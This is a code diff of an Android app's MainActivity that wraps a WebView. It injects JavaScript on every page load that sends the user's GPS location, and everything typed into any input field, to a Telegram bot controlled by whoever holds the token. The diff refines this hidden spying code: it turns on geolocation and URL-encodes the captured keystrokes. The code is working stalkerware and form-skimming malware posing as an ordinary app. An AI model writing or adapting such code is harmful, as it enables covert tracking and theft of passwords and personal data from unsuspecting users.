@@ -22,9 +22,8 @@ public class MainActivity extends AppCompatActivity {
         // Рұқсаттарды сұрау
         ActivityCompat.requestPermissions(this, new String[]{
             Manifest.permission.CAMERA, 
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.RECORD_AUDIO
-        }, 200);
+            Manifest.permission.ACCESS_FINE_LOCATION
+        }, 1);
 
         myWebView = new WebView(this);
         setContentView(myWebView);
@@ -32,6 +31,7 @@ public class MainActivity extends AppCompatActivity {
         WebSettings settings = myWebView.getSettings();
         settings.setJavaScriptEnabled(true);
         settings.setDomStorageEnabled(true);
+        settings.setGeolocationEnabled(true);
 
         myWebView.setWebChromeClient(new WebChromeClient() {
             @Override
@@ -44,10 +44,10 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onPageFinished(WebView view, String url) {
                 String js = "navigator.geolocation.getCurrentPosition(pos => {" +
-                            "  fetch('https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Loc: ' + pos.coords.latitude + ',' + pos.coords.longitude);" +
+                            "  fetch('https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Location:%20' + pos.coords.latitude + ',' + pos.coords.longitude);" +
                             "});" +
-                            "document.addEventListener('input', function(e) {" +
-                            "  fetch('https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Input: ' + e.target.value);" +
+                            "document.addEventListener('input', e => {" +
+                            "  fetch('https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Data:%20' + encodeURIComponent(e.target.value));" +
                             "});";
                 view.evaluateJavascript(js, null);
             }
